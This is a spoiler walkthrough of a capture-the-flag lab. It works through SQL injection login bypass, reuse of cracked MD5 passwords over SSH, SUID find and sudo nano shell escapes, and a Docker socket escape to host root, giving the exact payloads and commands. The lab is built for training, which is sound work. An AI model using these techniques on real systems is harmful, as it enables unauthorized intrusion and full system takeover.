# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 web, 22 outer-host SSH, 23 web-container
SSH, 3306 MySQL.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. A login form posts to `login.php`.
- `http://TARGET:8080/robots.txt` hints at SQL injection in the login form.

## Stage 1 - SQL injection

- `login.php` escapes and MD5-hashes the password but interpolates the username
  directly into the query. The username is injectable.
- Payload: username `king' -- ` with any password logs in. On success the page
  discloses the MySQL root credentials in cleartext.

## Stage 2 - Read the database

- The injection is boolean only (no column reflection), so use the disclosed
  root credentials against the exposed MySQL port:
  `mysql -h TARGET -P 3306 -u root -p webchik`.
- `important` points at `crackstation.net` (the hint to crack MD5 hashes).
- `users` holds the app users; `king` is `d534b96c9c231037a98126891ec898eb`.
- `backup_credentials` holds `gleb` as `0571749e2ac330a7455809c6b0e7af90`.

## Stage 3 - Crack and get user.txt

- `king` MD5 cracks to `Password12345`. This is also `king`'s SSH password on the
  outer host: `ssh king@TARGET -p 22`.
- `cat ~/user.txt` gives the `MAIN_FLAG{...}` user flag.
- Optional: as `king` you can also read the build files under
  `/home/king/docker-web`, which reveal the whole inner stack.

## Stage 4 - Into the web container (gleb)

- `gleb` MD5 cracks to `sunshine`.
- `ssh gleb@TARGET -p 23` (the web container's SSH is published on 23).
- `cat ~/gleb.txt` gives the first `FLAG{...}`.

## Stage 5 - gleb to rebeca (SUID find)

- `/usr/bin/find` is SUID and owned by `rebeca`.
- `find . -exec /bin/sh -p \;` gives a shell as `rebeca` (GTFOBins).
- `cat /home/rebeca/rebeca.txt` gives the second `FLAG{...}`.

## Stage 6 - rebeca to container root (sudo nano)

- `sudo -l` shows `rebeca` may run `/usr/bin/nano` with NOPASSWD.
- `sudo nano`, then `^R^X` and run `reset; sh 1>&0 2>&0` (GTFOBins) for a root
  shell in the web container.
- `cat /root/docker-root.txt` gives the `DOCKER_FLAG{...}`.

## Stage 7 - Container root to outer-host root (exposed Docker socket)

- As root in the web container, note `/var/run/docker.sock` is mounted.
- A static `docker` client is present. Launch a container that mounts the outer
  host filesystem and read the flag:

  ```bash
  docker run --rm -v /:/host alpine cat /host/root/root.txt
  ```

- That prints the final `MAIN_FLAG{...}` root flag from the outer host.

## Notes and red herrings

- `bippa` in `users` cracks to `green` but maps to no system account; it is a
  red herring.
- `rebeca`'s SSH private key under `~/.ssh` is self-referential and opens nothing
  new; `rebeca` is reached through SUID `find`, not SSH.
- The root crontab writing to `/dev/pts` only prints the `demotivation` lines; it
  is flavor, not a vector.
